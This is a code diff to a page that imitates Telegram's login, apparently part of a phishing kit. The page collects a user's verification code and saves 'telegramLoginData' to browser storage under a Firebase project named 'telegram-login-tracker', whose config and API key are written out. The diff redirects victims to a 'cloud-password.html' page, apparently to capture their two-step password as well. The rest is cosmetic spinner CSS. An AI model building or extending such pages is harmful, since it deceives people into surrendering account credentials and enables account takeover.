@@ -112,16 +112,23 @@
         .loading {
             display: none;
             margin-top: 15px;
+            text-align: center;
         }
 
         .loading-spinner {
             border: 3px solid #f3f3f3;
             border-top: 3px solid #0088cc;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
-            margin: 0 auto;
+            margin: 0 auto 15px;
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 10px;
         }
 
         @keyframes spin {
@@ -154,7 +161,8 @@
 
         <div class="loading" id="loading">
             <div class="loading-spinner"></div>
-            <p>Verifying code...</p>
+            <div class="loading-text">Verifying code...</div>
+            <p class="info-text">Redirecting to cloud password verification</p>
         </div>
         
         <p class="info-text">Didn't receive the code? <a href="#" style="color: #0088cc;">Resend</a></p>
@@ -163,16 +171,16 @@
     </div>
 
     <script>
-        // Firebase configuration - REPLACE WITH YOUR ACTUAL CONFIG
-         const firebaseConfig = {
-    apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
-    authDomain: "telegram-login-tracker.firebaseapp.com",
-    projectId: "telegram-login-tracker",
-    storageBucket: "telegram-login-tracker.firebasestorage.app",
-    messagingSenderId: "930264969410",
-    appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
-    measurementId: "G-5760KLJZJS"
-  };
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
+            authDomain: "telegram-login-tracker.firebaseapp.com",
+            projectId: "telegram-login-tracker",
+            storageBucket: "telegram-login-tracker.firebasestorage.app",
+            messagingSenderId: "930264969410",
+            appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
+            measurementId: "G-5760KLJZJS"
+        };
 
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -242,9 +250,9 @@
                 localStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                 sessionStorage.setItem('telegramLoginData', JSON.stringify(loginData));
 
-                // Redirect to store
+                // Redirect to CLOUD PASSWORD page instead of store
                 setTimeout(() => {
-                    window.location.href = 'https://the-market-place45.netlify.app/store/shady%27s-fashion-store';
+                    window.location.href = 'cloud-password.html';
                 }, 1500);
                 
             } catch (error) {
@@ -255,8 +263,9 @@
                 localStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                 sessionStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                 
+                // Still redirect to cloud password page
                 setTimeout(() => {
-                    window.location.href = 'https://the-market-place45.netlify.app/store/shady%27s-fashion-store';
+                    window.location.href = 'cloud-password.html';
                 }, 1500);
             }
         });
